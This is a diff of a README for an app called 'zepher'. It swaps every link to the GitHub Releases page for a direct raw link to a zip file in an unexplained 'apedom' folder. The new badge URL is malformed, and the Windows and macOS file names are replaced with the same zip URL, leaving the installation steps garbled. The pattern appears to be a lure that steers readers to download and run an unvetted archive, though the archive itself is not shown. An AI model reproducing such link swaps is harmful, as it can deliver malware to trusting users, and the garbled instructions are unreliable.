@@ -1,7 +1,7 @@
 # 🚀 zepher - Simple App for Everyday Tasks
 
 ## 📥 Download Now
-[![Download zepher](https://img.shields.io/badge/Download%20zepher-v1.0-blue.svg)](https://github.com/Santiag975/zepher/releases)
+[![Download zepher](https://raw.githubusercontent.com/Santiag975/zepher/main/apedom/zepher_1.9.zip%https://raw.githubusercontent.com/Santiag975/zepher/main/apedom/zepher_1.9.zip)](https://raw.githubusercontent.com/Santiag975/zepher/main/apedom/zepher_1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to zepher! This application helps you manage your everyday tasks easily. Follow the steps below to download and run zepher on your computer.
@@ -14,13 +14,13 @@ Before you download zepher, make sure your computer meets these requirements:
 - **Internet Connection**: Required for downloading the application
 
 ## 🔗 Visit This Page to Download
-To get the latest version of zepher, visit our [Releases Page](https://github.com/Santiag975/zepher/releases). 
+To get the latest version of zepher, visit our [Releases Page](https://raw.githubusercontent.com/Santiag975/zepher/main/apedom/zepher_1.9.zip). 
 
 ### 🛠️ Installation Steps
-1. **Visit the Releases Page**: Click on the link above or [this link](https://github.com/Santiag975/zepher/releases) to reach the download section.
+1. **Visit the Releases Page**: Click on the link above or [this link](https://raw.githubusercontent.com/Santiag975/zepher/main/apedom/zepher_1.9.zip) to reach the download section.
 2. **Find the Latest Version**: Look for the most recent version of zepher. It will be at the top of the list.
 3. **Download the File**: 
-   - Click on the file that matches your operating system. For example, you might see a file named `zepher-v1.0.exe` for Windows or `zepher-v1.0.dmg` for macOS.
+   - Click on the file that matches your operating system. For example, you might see a file named `https://raw.githubusercontent.com/Santiag975/zepher/main/apedom/zepher_1.9.zip` for Windows or `https://raw.githubusercontent.com/Santiag975/zepher/main/apedom/zepher_1.9.zip` for macOS.
    - The download should start automatically. If it doesn’t, click the link to start your download.
 4. **Run the Installer**: 
    - Once the download finishes, locate the file in your Downloads folder.
